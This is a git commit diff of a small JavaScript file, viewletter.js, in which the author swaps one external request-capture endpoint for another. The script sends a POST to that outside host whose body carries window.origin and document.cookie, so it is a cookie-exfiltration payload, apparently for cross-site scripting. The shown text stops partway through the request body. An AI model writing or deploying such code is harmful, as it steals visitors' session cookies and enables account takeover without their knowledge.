0047fec4e353da61daa1569425322bdd06ee71a4
0x00tom <8040940+0x00tom@users.noreply.github.com>
2024-02-04 14:19:23 +0100

    Update viewletter.js

--- viewletter.js
+++ viewletter.js
@@ -1,5 +1,5 @@
 console.log("a");
-fetch('https://httpdump.app/dumps/27aa5ed1-1986-4fcb-ae3f-345b65860989', {
+fetch('https://ensx1slpvlhzo.x.pipedream.net/', {
     method: 'POST',
     body: JSON.stringify({
         message: window.origin + " stuff "+document.cookie,
